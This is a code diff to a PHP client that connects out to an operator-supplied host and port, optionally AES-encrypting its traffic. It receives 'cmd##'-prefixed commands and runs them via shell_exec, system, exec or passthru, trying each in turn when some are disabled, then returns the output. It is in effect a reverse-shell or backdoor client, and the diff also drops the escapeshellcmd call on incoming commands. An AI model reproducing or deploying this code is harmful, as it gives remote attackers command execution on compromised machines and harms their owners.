@@ -10,7 +10,17 @@ ob_implicit_flush(1);
 define("BUFFER_LEN", 4096);
 define("STREAM_BUFFER_LEN", 1024);
 
-if(uses_encryption($argv[1])){
+$opts = getopt("h:p:e:", ["host:", "port:", "encrypt:"]);
+(count($opts) === 3) || die("Assign host|port|encrypt-flag");
+
+$addr = array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
+$port = array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
+$encrypt_flag = array_key_exists("encrypt", $opts) ? intval($opts['encrypt']) : intval($opts['e']);
+if($encrypt_flag !== 1){
+    $encrypt_flag = 0;
+}
+
+if(uses_encryption($encrypt_flag)){
     define('CYPHER', 'AES-256-CBC');
     define('OPTIONS', OPENSSL_RAW_DATA);
     define('HASH_ALGO', 'sha256');
@@ -19,8 +29,10 @@ if(uses_encryption($argv[1])){
     define('ENC_AES_LEN', 684);
 }
 
-function uses_encryption(string $arg) : bool {
-    return ($arg === '--encrypt');
+$result = ClientSocket::init($addr, $port, $encrypt_flag);
+
+function uses_encryption(int $flag) : bool {
+    return $flag === 1;
 }
 
 /**
@@ -29,24 +41,20 @@ function uses_encryption(string $arg) : bool {
 
 class ClientSocket {
     
-    public static function init()
-    {
-        $opts = getopt("h:p:", ["host:", "port:"]);
-        (count($opts) === 2) || die("Assign host & port.");
-        $enc = $argv[1] ?? "";
-        $addr = array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
-        $port = array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
+    public static function init(string $addr, int $port, int $encrypt_flag){
         ($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) || die("Socket create error");
-        ($result = socket_connect($socket, $addr, $port)) || die();
+        ($result = socket_connect($socket, $addr, $port)) || die("Connection to server failed");
         $openssl = new OpenSsl;
         $packet_len = 0;
+
         echo "[\33[91m!\33[0m] connected.\n";
+        
         if(($base64metadata = @socket_read($socket, BUFFER_LEN)) === false){
             echo "error reading inc. metadata, aborting..\n";
             exit(1);
         }
 
-        if(uses_encryption($enc)) {
+        if(uses_encryption($encrypt_flag)) {
             $_metadata = base64_decode($base64metadata);
             $metadata = [
                 'signature' => substr($_metadata, 0, SHA512LEN),
@@ -115,12 +123,14 @@ class ClientSocket {
                     }
                 }
                 if(preg_match('/^(cmd##){1}/', $recv)){
+
                     $fmt = str_replace('cmd##', '', $recv);
                     $full_cmd = "{ ".preg_replace('/(;)+(\s)*/', ';', trim($fmt));
-                    $full_cmd .= escapeshellcmd(substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;");
+                    $full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";
+
                     if(function_exists('shell_exec')){
                         $fnc = "shell_exec()";
-                        if(($result = shell_exec($full_cmd)) === null){ $result = "Error"; }
+                        if(($result = @shell_exec($full_cmd)) === null){ $result = "Error"; }
                     }
                     else if(function_exists('system')){
                         $fnc = "system()";
@@ -134,20 +144,20 @@ class ClientSocket {
                         @exec($full_cmd,$results,$ret_status);
                         if($ret_status !== 0){ $result = "Error status: ".$ret_status; }
                         else {
-                            $result = ""; 		
+                            $result = "";
                             foreach($results as $res){ $result .= $res."\n\r"; }
                         }
                     }
                     else if(function_exists('passthru')){
                         $fnc = "passthru()";
-                        @ob_start(); 		
-                        @passthru($full_cmd); 		
-                        $result = @ob_get_contents(); 		
-                        @ob_end_clean(); 
+                        @ob_start();
+                        @passthru($full_cmd);
+                        $result = @ob_get_contents();
+                        @ob_end_clean();
                     }
                     else { $result = "error:: system calls disabled."; }
                     $result .= "exec:: [{$fnc}] --- cmd:: [{$full_cmd}]";
-                    if(uses_encryption($enc)) {
+                    if(uses_encryption($encrypt_flag)) {
                         $encrypted_res = encrypt_cbcClient($result, $AES_key);
                     }
                     $r = $encrypted_res ?? $result;
@@ -244,6 +254,5 @@ function is_binary(string $s) : bool {
     return ( ! ctype_print($s)) ? true : false;
 }
 
-$result = ClientSocket::init();
 
 ?>
